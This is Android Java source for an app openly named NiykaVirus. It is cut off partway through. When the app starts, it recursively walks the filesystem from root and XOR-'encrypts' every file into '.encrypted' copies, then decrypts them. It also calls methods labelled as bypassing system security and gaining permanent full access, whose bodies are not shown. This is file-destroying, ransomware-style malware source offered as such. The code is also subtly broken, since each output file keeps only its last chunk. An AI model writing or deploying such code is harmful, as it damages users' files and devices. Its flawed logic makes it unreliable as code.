
// NiykaVirus.java
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import java.io.*;
import java.util.*;

public class NiykaVirus extends Activity {
    private static final String TAG = "NiykaVirus";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Encrypt and decrypt all files
        encryptAllFiles();
        decryptAllFiles();

        // Bypass system security
        bypassSystemSecurity();

        // Full system access
        fullSystemAccess();

        // Forever access to all folders and files
        foreverAccess();
    }

    private void encryptAllFiles() {
        try {
            File[] files = new File("/").listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        encryptFile(file);
                    } else if (file.isDirectory()) {
                        encryptDirectory(file);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error encrypting files: " + e.getMessage());
        }
    }

    private void encryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    encryptFile(file);
                } else if (file.isDirectory()) {
                    encryptDirectory(file);
                }
            }
        }
    }

    private void encryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int read;
            byte[] encrypted = new byte[1024];
            while ((read = fis.read(buffer)) != -1) {
                for (int i = 0; i < read; i++) {
                    encrypted[i] = (byte) (buffer[i] ^ 0x12);
                }
                FileOutputStream fos = new FileOutputStream(file.getAbsolutePath() + ".encrypted");
                fos.write(encrypted, 0, read);
                fos.close();
            }
            fis.close();
        } catch (Exception e) {
            Log.e(TAG, "Error encrypting file: " + e.getMessage());
        }
    }

    private void decryptAllFiles() {
        try {
            File[] files = new File("/").listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile() && file.getName().endsWith(".encrypted")) {
                        decryptFile(file);
                    } else if (file.isDirectory()) {
                        decryptDirectory(file);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error decrypting files: " + e.getMessage());
        }
    }

    private void decryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile() && file.getName().endsWith(".encrypted")) {
                    decryptFile(file);
                } else if (file.isDirectory()) {
                    decryptDirectory(file);
                }
            }
        }
    }

    private void decryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file.getAbsolutePath());
            byte[] buffer = new byte[1024];
            int read;
            byte[] decrypted = new byte[1024];
            while ((read = fis.read(buffer)) != -1) {
                for (int i = 0; i < read; i++) {
                    decrypted[i] = (byte) (buffer[i] ^ 0x12);
                }
                FileOutputStream fos = new FileOutputStream(file.getAbsolutePath().replace(".encrypted", ""));
                fos.write(decrypted, 0, read);
                fos.close();
            }
            fis.close();
        } catch (Exception e) {
            Log.e(TAG, "Error decrypting file: " + e.getMessage());
        }
    }

    private void bypassSystemSecurity() {
